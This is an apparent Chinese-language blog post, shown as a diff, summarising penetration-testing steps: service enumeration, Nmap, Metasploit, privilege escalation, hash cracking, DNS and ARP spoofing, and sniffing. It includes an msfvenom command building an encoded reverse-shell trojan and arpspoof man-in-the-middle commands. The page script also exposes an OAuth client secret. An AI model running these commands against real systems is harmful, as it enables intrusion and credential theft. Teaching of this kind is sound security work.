+<p><span id="Amap"></span></p>
+<h5 id="Amap"><a href="#Amap" class="headerlink" title="#Amap"></a>#Amap</h5><p><code>Amap</code>是一个服务枚举工具。使用该工具能识别正运行在一个指定端口或一个范围端口上的应用程序。从下面的输出结果的第二段内容中可以了解到主机<code>192.168.41.136</code>使用的是<code>Red Hat</code>操作系统，并且正在运行着版本为<code>2.2.15</code>的<code>Apache</code>服务器，其开放的端口是<code>80</code>。从倒数第二行信息中可以看到该主机还运行了<code>DNS服务器</code>，其开放的端口是<code>53</code>。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali:~# amap -bq 192.168.41.136 50-100</div><div class="line"></div><div class="line">amap v5.4 (www.thc.org/thc-amap) started at 2014-04-21 11:20:36 - APPLICATION MAPPING mode</div><div class="line">Protocol on 192.168.41.136:80/tcp matches http - banner: <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span>\n<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span>\n<span class="tag">&lt;<span class="name">title</span>&gt;</span>501 Method Not Implemented<span class="tag">&lt;/<span class="name">title</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>\n<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Method Not Implemented<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>\n<span class="tag">&lt;<span class="name">p</span>&gt;</span> to / not supported.<span class="tag">&lt;<span class="name">br</span> /&gt;</span>\n<span class="tag">&lt;/<span class="name">p</span>&gt;</span>\n<span class="tag">&lt;<span class="name">hr</span>&gt;</span>\n<span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.2.15 (Red Hat) Server at www.benet.c</div><div class="line">Protocol on 192.168.41.136:80/tcp matches http-apache-2 - banner: <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span>\n<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span>\n<span class="tag">&lt;<span class="name">title</span>&gt;</span>501 Method Not Implemented<span class="tag">&lt;/<span class="name">title</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>\n<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Method Not Implemented<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>\n<span class="tag">&lt;<span class="name">p</span>&gt;</span> to / not supported.<span class="tag">&lt;<span class="name">br</span> /&gt;</span>\n<span class="tag">&lt;/<span class="name">p</span>&gt;</span>\n<span class="tag">&lt;<span class="name">hr</span>&gt;</span>\n<span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.2.15 (Red Hat) Server at www.benet.c</div><div class="line">Protocol on 192.168.41.136:53/tcp matches dns - banner: \f</div><div class="line">amap v5.4 finished at 2014-04-21 11:20:48</div></pre></td></tr></table></figure>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><ul>
+<li><a href="#Nmap">Nmap</a></li>
+</ul>
+<p><span id="Nmap"></span></p>
+<h5 id="Nmap"><a href="#Nmap" class="headerlink" title="# Nmap"></a># Nmap</h5><p><code>Nmap</code>（网络映射器）是一款用于网络发现和安全审计的网络安全工具，可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。</p>
+<blockquote>
+<p>Nmap通常用在信息搜集阶段，用于搜集目标机主机的基本状态信息。扫描结果可以作为漏洞扫描、漏洞利用和权限提升阶段的输入。例如，业界流行的漏洞扫描工具Nessus与漏洞利用工具Metasploit都支持导入Nmap的XML格式结果，而Metasploit框架内也集成了Nmap工具</p>
+</blockquote>
+<p>nmap的说明可以通过<code>man nmap</code>来进行查看。</p>
+<p>以下为一些参数例子:</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">对多个目标执行默认参数扫描：</div><div class="line">nmap scanme<span class="selector-class">.nmap</span><span class="selector-class">.org</span> <span class="number">192.168</span>.<span class="number">0.0</span>/<span class="number">8</span> <span class="number">10.0</span>.<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>-<span class="number">7.0</span>-<span class="number">255</span></div><div class="line"></div><div class="line">随机地找一些网站浏览:</div><div class="line">nmap -sS -PS80 -iR <span class="number">0</span> -<span class="selector-tag">p</span> <span class="number">80</span></div></pre></td></tr></table></figure>
+<p>更多的参数及使用方法可以看手册或者看我的<a href="https://hellohxk.com/blog/nmap/" target="_blank" rel="external">这篇文章，对常用参数做了总结</a>。</p>
+<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>常见自动化扫描工具</p>
+<ul>
+<li>Nessus</li>
+<li>openVAS</li>
+<li>AWVS</li>
+<li>appscan</li>
+</ul>
+<p>具体使用就不在这里介绍了，使用起来都比较简单，重要的是规则的设置。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul>
+<li>Metasploit</li>
+</ul>
+<p><code>metasploit-framework</code>渗透测试框架，是最为常用的漏洞利用工具，其内置了很多<code>exploit</code>以供使用，一般的流程是这样：</p>
+<ol>
+<li>使用漏洞扫描工具对target进行漏洞扫描，<code>metasploit</code>内置了<code>nessus</code>，但个人更喜欢用web版</li>
+<li>根据漏洞信息查询相关信息，比较简单的漏洞如弱口令、后门可以直接利用，其他<code>exploit</code>如果内置了可以找到相关模块进行运行，如果没有内置，有CVE编号或其他信息，可以去<a href="https://www.exploit-db.com/" target="_blank" rel="external">https://www.exploit-db.com/</a>数据库查找，下载<code>exploit</code></li>
+<li>使用<code>metasploit</code>加载<code>exploit</code>或直接运行得到<code>shell</code></li>
+</ol>
+<p><code>metasploit v4.0</code>之后getshell之后会有<code>meterpreter</code>(有就进行用),其是后渗透测试的利器。</p>
+<p><code>msfvenom</code> 用于生成木马，目标一旦执行，攻击者便可以连接目标。<br>例如:</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -<span class="selector-tag">i</span> <span class="number">5</span> -<span class="selector-tag">b</span> `\x00` LHOST=<span class="number">192.168</span>.<span class="number">1.113</span> LPORT=<span class="number">443</span> -f exe &gt; abc.exe</div></pre></td></tr></table></figure>
+<h3 id="后渗透测试"><a href="#后渗透测试" class="headerlink" title="后渗透测试"></a>后渗透测试</h3><ul>
+<li>权限提升</li>
+<li>内网渗透</li>
+<li>数据获取</li>
+<li>日志清除</li>
+</ul>
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>权限提升就是将某个用户原来拥有的最低权限提高到最高。因为我们所获得的shell一般不是root，而很多操作需要<code>root/system</code>账户才能执行。权限提升大致有以下方法:</p>
+<ul>
+<li><a href="#local-vulnerability">利用本地漏洞</a></li>
+<li><a href="#cipher-attack">密码攻击</a></li>
+<li><a href="#network-spoofing">网络欺骗攻击</a></li>
+<li><a href="#network-sniffing">网络嗅探</a></li>
+<li><a href="#fake-token">使用假冒令牌</a></li>
+<li><a href="#SET">使用社会工程学工具包</a></li>
+</ul>
+<p><span id="local-vulnerability"></span></p>
+<h5 id="利用本地漏洞"><a href="#利用本地漏洞" class="headerlink" title="# 利用本地漏洞"></a># 利用本地漏洞</h5><p>取得shell之后，通常分析其内核版本，寻找提升权限的<code>exploit</code>，或根据自身所开放服务，进行测试。没有通用的方案，需要视情况而定。</p>
+<p><span id="cipher-attack"></span></p>
+<h5 id="密码攻击"><a href="#密码攻击" class="headerlink" title="# 密码攻击"></a># 密码攻击</h5><p>构成身份验证的要素可分为三大类：</p>
+<ol>
+<li>基于所知(只有特定秘密的持有人才能“知道”有关秘密)  /  <code>密码</code></li>
+<li>基于所有(持有者即可获得登录权) / <code>令牌</code></li>
+<li>基于特征 / <code>指纹识别</code>和<code>视网膜识别</code></li>
+</ol>
+<p><strong>目前多数系统广泛依赖单一的密码验证</strong></p>
+<p>一般密码在系统中均以hash存储</p>
+<p><strong>离线哈希破解</strong></p>
+<ol>
+<li>识别hash类型 (<code>hash-identifier</code>)</li>
+<li>hash破解(<code>hashcat</code>)</li>
+<li>利用彩虹表(<code>rtgen</code>、<code>rtsort</code>、<code>rcarack</code>)</li>
+</ol>
+<p>其他有用工具</p>
+<ul>
+<li><code>samdump2</code>  windows密码哈希破解(win下密码在<code>c:\windows\system32\config</code>中，系统运行时会被锁定，无法查看)</li>
+<li><code>john</code> DES和crypt型哈希</li>
+</ul>
+<p><span id="network-spoofing"></span></p>
+<h5 id="网络欺骗攻击"><a href="#网络欺骗攻击" class="headerlink" title="# 网络欺骗攻击"></a># 网络欺骗攻击</h5><p>网络欺骗泛指修改网络数据的各种手段。例如，伪造MAC 地址、伪造IP地址等的数据，都属于网络欺骗的范畴。</p>
+<p><strong>DNSChef</strong></p>
+<blockquote>
+<p>DNS代理工具。它可替DNS服务器对被测主机进行DNS回复，把域名解析为攻击者管控的IP，从而让攻击者的主机扮演真正的服务器的角色。DNSChef的这种功能可用来分析甚至控制客户主机的网络流量。</p>
+</blockquote>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnschef --fakeip=<span class="number">192.168</span><span class="number">.2</span><span class="number">.21</span> --fakedomains google.com</div></pre></td></tr></table></figure>
+<p><strong>前提: 目标主机的DNS服务器为<code>DNSChef</code>的主机</strong></p>
+<p><strong>arpspoof</strong><br>arp欺骗/arp中间人攻击</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1<span class="selector-class">.1</span>为网关</div><div class="line">1<span class="selector-class">.2</span>为测试主机</div><div class="line">1<span class="selector-class">.3</span>为目标主机</div><div class="line"></div><div class="line"><span class="selector-tag">arpspoof</span> <span class="selector-tag">-t</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.3</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.1</span></div><div class="line"><span class="selector-tag">arpspoof</span> <span class="selector-tag">-t</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.1</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.3</span></div></pre></td></tr></table></figure>
+<p>然后开启IP转发，即完成中间人代理，这样所有流量都会通过<code>192.168.1.2</code>进行数据转发。</p>
+<p><strong>Ettercap</strong><br>当arp欺骗成功后，其可以修改数据连接，截获<code>FTP</code>、<code>HTTP</code>、<code>POP</code>和<code>SSH1</code>等协议的密码。</p>
+<p><span id="network-sniffing"></span></p>
+<h5 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="# 网络嗅探"></a># 网络嗅探</h5><p><strong>Dsniff</strong></p>
+<blockquote>
+<p>Dsniff 能够在网络中捕获密码。目前，它可从以下协议中捕获密码：FTP、Telnet、SMTP、HTTP、POP、poppass、NNTP、IMAP、SNMP、LDAP、Rlogin、RIP、OSPF、PPTP MS-CHAP、NFS、VRRP、YP/NIS、SOCKS、X11、CVS、IRC、AIM、ICQ、 Napster、PostgreSQL、Meeting Maker、Citrix ICA、Symantec pcAnywhere、NAI Sniffer、Microsoft SMB、Oracle SQL*Net、Sybase 以及Microsoft SQL</p>
+</blockquote>
+<p><strong>tcpdump/wireshark</strong><br>抓取网络数据包进行离线分析。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    empty_xl
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/blog/penetration-testing/" title="渗透测试相关总结">http://yoursite.com/blog/penetration-testing/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="external nofollow" target="_blank">CC BY-NC-ND 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-security/" rel="tag"><i class="fa fa-tag"></i> web security</a>
+          
+            <a href="/tags/penetration-testing/" rel="tag"><i class="fa fa-tag"></i> penetration testing</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/logical-vulnerability/" rel="next" title="常见逻辑漏洞总结">
+                <i class="fa fa-chevron-left"></i> 常见逻辑漏洞总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/scanning-principle/" rel="prev" title="扫描器原理总结">
+                扫描器原理总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script>
+    var gitment = new Gitment({
+      // 根据文章标题设置唯一评论id
+    // id: '', // optional
+    owner: 'emptyxl',
+    repo: 'emptyxl.github.io',
+    oauth: {
+      client_id: 'fa7413e3c0207a96ae03',
+      client_secret: 'a599fef18d25ba5c813d2e437260892e146462a2',
+      }
+    })
+    gitment.render('comments')
+    </script>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="empty_xl" />
+          <p class="site-author-name" itemprop="name">empty_xl</p>
+           
+              <p class="site-description motion-element" itemprop="description">hello world!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">51</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">35</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">77</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/emptyxl" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      Github
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="/mail/index.html" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                    
+                      E-Mail
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-nd.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PTES-渗透测试执行标准"><span class="nav-number">1.</span> <span class="nav-text">PTES 渗透测试执行标准</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透测试"><span class="nav-number">2.</span> <span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#范围界定"><span class="nav-number">2.1.</span> <span class="nav-text">范围界定</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">2.2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#域名信息"><span class="nav-number">2.2.1.</span> <span class="nav-text">域名信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Google-Hacking-Google-Dorks"><span class="nav-number">2.2.1.1.</span> <span class="nav-text"># Google Hacking / Google Dorks</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#whois"><span class="nav-number">2.2.1.2.</span> <span class="nav-text"># whois</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#whois反查"><span class="nav-number">2.2.1.3.</span> <span class="nav-text"># whois反查</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#子域名收集"><span class="nav-number">2.2.1.4.</span> <span class="nav-text"># 子域名收集</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IP地址信息"><span class="nav-number">2.2.2.</span> <span class="nav-text">IP地址信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#host-dig"><span class="nav-number">2.2.2.1.</span> <span class="nav-text"># host / dig</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dnsenum"><span class="nav-number">2.2.2.2.</span> <span class="nav-text"># dnsenum</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dnsdict6"><span class="nav-number">2.2.2.3.</span> <span class="nav-text"># dnsdict6</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DMitry"><span class="nav-number">2.2.2.4.</span> <span class="nav-text"># DMitry</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#tcptraceroute"><span class="nav-number">2.2.2.5.</span> <span class="nav-text"># tcptraceroute</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DNS-Zone-Transfer"><span class="nav-number">2.2.2.6.</span> <span class="nav-text"># DNS-Zone-Transfer</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他信息收集方法"><span class="nav-number">2.2.3.</span> <span class="nav-text">其他信息收集方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#theharvester"><span class="nav-number">2.2.3.1.</span> <span class="nav-text"># theharvester</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Metagoofil"><span class="nav-number">2.2.3.2.</span> <span class="nav-text"># Metagoofil</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断是否为真实IP地址"><span class="nav-number">2.2.4.</span> <span class="nav-text">判断是否为真实IP地址</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ping检测"><span class="nav-number">2.2.4.1.</span> <span class="nav-text"># ping检测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修改host"><span class="nav-number">2.2.4.2.</span> <span class="nav-text"># 修改host</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#抓包观察"><span class="nav-number">2.2.4.3.</span> <span class="nav-text"># 抓包观察</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nslookup"><span class="nav-number">2.2.5.</span> <span class="nav-text"># nslookup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询域名其他记录"><span class="nav-number">2.2.6.</span> <span class="nav-text"># 查询域名其他记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通过邮件、图片获得"><span class="nav-number">2.2.7.</span> <span class="nav-text"># 通过邮件、图片获得</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#活跃主机识别"><span class="nav-number">2.2.8.</span> <span class="nav-text">活跃主机识别</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ping-ping6-arping"><span class="nav-number">2.2.8.1.</span> <span class="nav-text"># ping/ping6/arping</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#fping"><span class="nav-number">2.2.8.2.</span> <span class="nav-text"># fping</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#hping3-nping"><span class="nav-number">2.2.8.3.</span> <span class="nav-text"># hping3/nping</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#操作系统识别"><span class="nav-number">2.2.9.</span> <span class="nav-text">操作系统识别</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#p0f"><span class="nav-number">2.2.9.1.</span> <span class="nav-text"># p0f</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务枚举"><span class="nav-number">2.2.10.</span> <span class="nav-text">服务枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Amap"><span class="nav-number">2.2.10.1.</span> <span class="nav-text">#Amap</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口扫描"><span class="nav-number">2.2.11.</span> <span class="nav-text">端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Nmap"><span class="nav-number">2.2.11.1.</span> <span class="nav-text"># Nmap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞扫描"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后渗透测试"><span class="nav-number">2.5.</span> <span class="nav-text">后渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#权限提升"><span class="nav-number">2.5.1.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用本地漏洞"><span class="nav-number">2.5.1.1.</span> <span class="nav-text"># 利用本地漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#密码攻击"><span class="nav-number">2.5.1.2.</span> <span class="nav-text"># 密码攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#网络欺骗攻击"><span class="nav-number">2.5.1.3.</span> <span class="nav-text"># 网络欺骗攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#网络嗅探"><span class="nav-number">2.5.1.4.</span> <span class="nav-text"># 网络嗅探</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    
+    &emsp;&emsp;|&emsp;
+  </span>
+  <span class="author" itemprop="copyrightHolder">empty_xl</span>
+</div>
+
+
+<div class="powered-by">
+  
+  Power &mdash; Hexo
+</div>
+
+<div class="theme-info">
+  
+  Theme &mdash; NexT.Mist
+</div>
+<div>
+<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
